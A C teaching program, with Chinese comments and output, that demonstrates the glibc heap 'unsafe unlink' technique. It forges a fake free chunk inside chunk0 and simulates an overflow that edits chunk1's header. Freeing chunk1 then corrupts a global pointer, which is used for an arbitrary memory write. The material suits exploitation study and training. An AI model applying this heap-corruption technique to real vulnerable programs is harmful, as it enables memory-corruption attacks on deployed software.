#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr, "当您在已知位置有指向某个区域的指针时，可以调用 unlink\n");
    fprintf(stderr, "最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n");

    int malloc_size = 0x80; //要足够大来避免进入 fastbin
    int header_size = 2;

    fprintf(stderr, "本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "全局变量 chunk0_ptr 在 %p, 指向 %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "我们想要破坏的 chunk 在 %p\n", chunk1_ptr);

    fprintf(stderr, "在 chunk0 那里伪造一个 chunk\n");
    fprintf(stderr, "我们设置 fake chunk 的 'next_free_chunk' (也就是 fd) 指向 &chunk0_ptr 使得 P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr, "我们设置 fake chunk 的 'previous_free_chunk' (也就是 bk) 指向 &chunk0_ptr 使得 P->bk->fd = P.\n");
    fprintf(stderr, "通过上面的设置可以绕过检查: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk 的 fd: %p\n",(void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk 的 bk: %p\n\n",(void*) chunk0_ptr[3]);

    fprintf(stderr, "现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr, "通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n");
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr, "如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n",(void*)chunk1_hdr[0]);
    fprintf(stderr, "接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n");
    chunk1_hdr[1] &= ~1;

    fprintf(stderr, "现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n");
    free(chunk1_ptr);

    fprintf(stderr, "此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr, "chunk0_ptr 现在指向我们想要的位置，我们用它来覆盖我们的 victim string。\n");
    fprintf(stderr, "之前的值是: %s\n",victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL;
    fprintf(stderr, "新的值是: %s\n",victim_string);
}